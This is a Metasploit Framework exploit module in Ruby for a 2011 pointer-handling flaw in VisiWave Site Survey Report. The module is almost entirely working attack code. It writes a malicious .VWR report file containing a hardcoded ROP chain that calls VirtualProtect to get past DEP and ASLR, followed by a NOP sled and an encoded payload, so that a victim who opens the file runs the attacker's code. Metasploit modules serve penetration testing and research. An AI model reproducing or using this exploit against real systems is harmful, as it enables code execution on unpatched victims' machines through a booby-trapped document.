# $Id: visiwave_vwr_type.rb 12716 2011-05-25 13:57:12Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;VisiWave VWR File Parsing Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a vulnerability found in VisiWave&#039;s Site Survey Report application.
                When processing .VWR files, VisiWaveReport.exe attempts to match a valid pointer based on the &#039;Type&#039;
                property (valid ones include &#039;Properties&#039;, &#039;TitlePage&#039;, &#039;Details&#039;, &#039;Graph&#039;, &#039;Table&#039;, &#039;Text&#039;,
                &#039;Image&#039;), but if a match isn&#039;t found, the function that&#039;s supposed to handle this routine
                ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10]
                instruction.  This allows attackers to overwrite it with any arbitrary value, and results code
                execution.  A patch is available at visiwave.com; the fix is done by XORing the return value as
                null if no match is found, and then it is validated before use.
 
                NOTE: During installation, the application will register two file handle&#039;s, VWS and VWR and allows a
                victim user to &#039;double click&#039; the malicious VWR file and execute code.  This module was also built
                to bypass ASLR and DEP.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;mr_me&#039;,  # original discovery & msf exploit
                    &#039;TecR0c&#039;  # msf exploit
                ],
            &#039;Version&#039;        => &#039;$Revision: 12716 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;72464&#039;],
                    [ &#039;URL&#039;, &#039;http://www.visiwave.com/blog/index.php?/archives/4-Version-2.1.9-Released.html&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.stratsec.net/Research/Advisories/VisiWave-Site-Survey-Report-Trusted-Pointer-%28SS-20&#039;],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 2000,
                    &#039;BadChars&#039;    => "\x00\x0a\x0d",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3/Windows 7 SP0&#039;,
                        {
                            &#039;Offset&#039; => 3981,         # offset to rop gadgets
                            &#039;Pointer&#039; => 0x007AF938,  # POP R32; POP R32; POP R32; ADD ESP 50; RETN ("magic" pointer)
                        }
                    ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;May 20 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.vwr&#039;]),
            ], self.class)
    end
 
    def exploit
 
        # Allowing nulls in our rop chain is like giving gold to midas.
        # instructions taken from the applications non aslr modules
        # libcurl.dll, VisiWaveReport.exe and blah blah
        rop_gadgets =
        [
            0x1001AFBD,  # INC EBP; PUSH ESP; POP EDI; POP ESI; POP EBP; POP EBX; RET
            0xc0fff333,  # junk
            0xc0fff333,  # junk
            0x000004cf,  # lwSize 1231 bytes
            0x100017DD,  # POP ECX; RETN
            0x10037a60,  # Writeable address from .data of libcurl.dll
            0x10011104,  # POP EDX; RETN
            0x00000040,  # RWX for VirtualProtect()
            0x10026E4D,  # MOV EAX,EDI # POP EDI # RETN
            0x10002ac6,  # RETN
            0x10022641,  # ADD EAX, 20; RETN
            0x10022641,  # ADD EAX, 20; RETN
            0x10022641,  # ADD EAX, 20; RETN
            0x10022641,  # ADD EAX, 20; RETN
            0x10022641,  # ADD EAX, 20; RETN
            0x10022641,  # ADD EAX, 20; RETN
            0x004048B1,  # XCHG EAX,EBP
            0x1001BD3F,  # POP EAX; RETN
            0x10032048,  # IAT Address - constant pointer to VirtualProtect()
            0x1000FA4A,  # MOV EAX,DWORD PTR DS:[EAX]; RETN
            0x00657fd7,  # XCHG EAX,ESI; RETN
            0x1000af40,  # PUSHAD; RET
        ].pack("V*")
 
        # grab the pointer to our buffer
        pointer = [target["Pointer"]].pack("V")
 
        sploit = pointer  # begin life in EDX
        sploit << rand_text_alphanumeric(target["Offset"])  # massive offset
        sploit << rop_gadgets      # rop chain
        sploit << make_nops(300)   # safe landing
        sploit << payload.encoded  # profit!
 
        vwr_data = "FileType: SSREPORT\r\n"
        vwr_data << "Product: VisiWave Site Survey, 1.6.5 Beta\r\n"
        vwr_data << "FileVersion: 10\r\n"
        vwr_data << "Item: Global Properties\r\n"
        vwr_data << "Checked: 1\r\n"
        vwr_data << "Type: #{sploit}\r\n"
        vwr_data << "SurveyFile: C:\Program Files\VisiWave Site Survey\Samples\SampleData.vws\r\n"
        vwr_data << "FloorPlanImageReport: C:\WINDOWS\Web\bullet.gif\r\n"
        vwr_data << "DefaultOrientation: 0\r\n"
        vwr_data << "Header:\r\n"
        vwr_data << "Footer:\r\n"
        vwr_data << "LeftMargin: 100\r\n"
        vwr_data << "RightMargin: 100\r\n"
        vwr_data << "TopMargin: 50\r\n"
        vwr_data << "BottomMargin: 50\r\n"
        vwr_data << "Item: #{rand_text_alpha(3)}\r\n"
        vwr_data << "Checked: 1\r\n"
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039;...")
        file_create(vwr_data)
    end
 
end



